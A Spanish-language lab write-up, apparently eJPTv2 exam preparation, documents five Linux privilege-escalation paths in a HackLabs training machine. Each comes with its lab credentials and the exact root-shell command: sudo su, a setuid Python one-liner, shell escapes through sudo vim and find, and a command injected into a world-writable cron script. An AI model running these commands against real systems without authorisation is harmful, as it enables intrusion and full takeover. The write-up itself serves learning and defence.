# 👑 Informe de Laboratorio: HackLabs - Privilege Escalation (SSH) 
**IP Objetivo:** 10.10.10.114 | **Fecha:** 01/05/2026 | **Objetivo:** Preparación eJPTv2

## 🎯 Objetivo
Demostrar múltiples vectores de escalada de privilegios en un sistema Linux, explotando configuraciones inseguras de sudo, binarios SUID y tareas cron para obtener acceso de root desde cinco usuarios diferentes.

## 🔍 Fase 1: Enumeración
- Se accedió al laboratorio `Privilege Escalation (SSH)` en `10.10.10.114`.
- Se disponía de cinco usuarios con credenciales conocidas y vectores de escalada específicos.

## 💥 Fase 2: Escalada de Privilegios (5 vectores)

### admin — sudo completo
- **Credenciales:** `admin:password1`
- **Comando:** `sudo su`
- **Resultado:** Shell de root directa.

### alice — SUID python3
- **Credenciales:** `alice:Password1`
- **Binario SUID:** `/usr/local/bin/python3.11`
- **Comando:** `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
- **Resultado:** Shell de root mediante explotación de binario SUID.

### bob — sudo vim (GTFOBins)
- **Credenciales:** `bob:welcome1`
- **Privilegio sudo:** `(ALL) NOPASSWD: /usr/bin/vim`
- **Comando:** `sudo vim -c ':!/bin/bash'`
- **Resultado:** Shell de root mediante abuso de privilegio sudo.

### charlie — Cron job world-writable
- **Credenciales:** `charlie:changeme`
- **Fallo:** Script `/opt/scripts/cleanup.sh` con permisos world-writable ejecutado por root en cron.
- **Comando:** Inyección de `cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash` en el script.
- **Resultado:** Shell de root con euid=0 tras esperar ~1 minuto.

### dave — sudo find (GTFOBins)
- **Credenciales:** `dave:P@ssw0rd`
- **Privilegio sudo:** `(ALL) NOPASSWD: /usr/bin/find`
- **Comando:** `sudo find . -exec /bin/bash \; -quit`
- **Resultado:** Shell de root mediante abuso de privilegio sudo.

## 🚩 Flag capturada
- **Ubicación:** `/root/root.txt`
- **Contenido:** `HL{r00t_pr1v3sc_succ3ss}`

## 🧠 Lecciones Aprendidas
1.  **Múltiples vectores:** Un sistema puede ser vulnerable a escalada de privilegios por múltiples vías (sudo, SUID, cron).
2.  **Configuraciones peligrosas:** `sudo` sin restricciones, binarios SUID en intérpretes (Python) y scripts world-writable en cron son errores críticos.
3.  **GTFOBins:** Recursos como GTFOBins son esenciales para explotar binarios comunes (vim, find) con privilegios sudo.

## 🏁 Conclusión
El laboratorio demuestra cinco vectores distintos de escalada de privilegios en un mismo sistema. La combinación de credenciales por defecto y configuraciones inseguras permite a un atacante obtener acceso de root de forma trivial.
